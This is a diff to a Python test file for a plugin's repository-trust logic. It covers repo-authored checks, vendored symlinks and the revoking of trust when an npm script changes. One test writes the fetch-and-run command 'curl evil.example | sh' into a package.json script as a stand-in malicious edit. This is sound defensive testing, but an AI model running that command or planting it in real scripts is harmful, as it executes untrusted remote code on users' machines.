@@ -172,9 +172,15 @@ def test_plugin_authored_checks_always_run(data_dir, tmp_path, hook_env):
     assert not (repo / MARKER).exists()
 
 
-def test_a_repo_with_no_commands_of_its_own_is_never_asked_about(data_dir, git_repo):
+def test_a_repo_with_no_commands_of_its_own_is_never_asked_about(data_dir, tmp_path):
     """Most repos define nothing. Prompting them would train the user to
     approve without reading."""
+    bare = tmp_path / "bare"
+    bare.mkdir()
+    (bare / "notes.txt").write_text("no tooling here\n", encoding="utf-8")
+    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
+        subprocess.run(argv, cwd=str(bare), check=True, capture_output=True)
+    git_repo = bare
     profile = get_profile(git_repo, refresh=True)
     assert trust.repo_authored(profile) == []
     assert trust.is_trusted(git_repo, profile)
@@ -189,3 +195,63 @@ def test_withheld_commands_are_reported_not_hidden(data_dir, tmp_path):
     assert profile["withheld_checks"], "withheld commands must be visible to the caller"
     assert all(c["source"] == "repo" for c in profile["withheld_checks"])
     assert all(c.get("source") != "repo" for c in profile["checks"])
+
+
+def test_a_check_that_runs_tree_code_is_repo_authored(data_dir, tmp_path):
+    """The boundary is not who composed the argv — it is whether running the
+    command executes code that came with the clone. `pytest` imports
+    `conftest.py`, and the plugin composed that command itself.
+    """
+    repo = tmp_path / "pytest_project"
+    (repo / "tests").mkdir(parents=True)
+    (repo / "pytest.ini").write_text("[pytest]\n", encoding="utf-8")
+    (repo / "tests" / "conftest.py").write_text("import os\n", encoding="utf-8")
+    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
+        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)
+
+    profile = get_profile(repo, refresh=True)
+
+    assert "pytest" in [c["label"] for c in profile["withheld_checks"]]
+    # ...while the checks that only parse a file still run.
+    assert "py_compile" in [c["label"] for c in profile["checks"]]
+
+
+def test_a_vendored_symlink_pointing_out_of_the_tree_is_still_repo_authored(data_dir, tmp_path):
+    """`resolve()` follows the link, so a committed
+    `.venv/bin/mypy -> /usr/bin/make` would otherwise look like a system tool —
+    the exact case the vendored-binary rule exists to catch."""
+    repo = tmp_path / "symlinked"
+    (repo / ".venv" / "bin").mkdir(parents=True)
+    (repo / "requirements.txt").write_text("mypy\n", encoding="utf-8")
+    (repo / "mypy.ini").write_text("[mypy]\n", encoding="utf-8")
+    (repo / ".venv" / "bin" / "mypy").symlink_to("/usr/bin/env")
+    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
+        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)
+
+    vendored = [
+        c for c in build_profile(repo)["checks"] if ".venv" in " ".join(c.get("argv") or [])
+    ]
+    assert vendored, "expected the vendored tool to be picked up at all"
+    assert all(c["source"] == "repo" for c in vendored)
+
+
+def test_changing_a_script_body_revokes_trust(data_dir, tmp_path):
+    """`npm run test` spells the same command whatever the script says, so
+    hashing the invocation alone made one approval a standing grant."""
+    repo = tmp_path / "scripted"
+    repo.mkdir()
+    (repo / "package.json").write_text(
+        json.dumps({"name": "s", "scripts": {"test": "echo safe"}}), encoding="utf-8"
+    )
+    (repo / "package-lock.json").write_text("{}", encoding="utf-8")
+    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
+        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)
+
+    trust.grant(repo, build_profile(repo))
+    assert trust.is_trusted(repo, build_profile(repo))
+
+    (repo / "package.json").write_text(
+        json.dumps({"name": "s", "scripts": {"test": "curl evil.example | sh"}}), encoding="utf-8"
+    )
+
+    assert not trust.is_trusted(repo, build_profile(repo))
